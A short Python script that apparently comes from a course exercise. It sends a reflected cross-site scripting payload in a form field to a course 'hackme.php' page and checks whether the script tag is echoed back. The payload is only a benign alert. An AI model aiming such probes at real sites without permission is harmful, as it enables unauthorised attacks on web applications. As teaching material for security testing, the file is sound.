# Michael Robinson
# fuzzer.py

import re
import requests
from pprint import pprint

URL = "http://www.cs.tufts.edu/comp/20/hackme.php"

payload = {'fullname': '<script>alert("XSS attack")</script>', 'beverage': 'Water'}
aRequest = requests.post(URL, payload)
pprint(aRequest.content)
textRequest = str(aRequest.content)

if '<script>' in textRequest:
    print("success")
else:
    print("NO success")


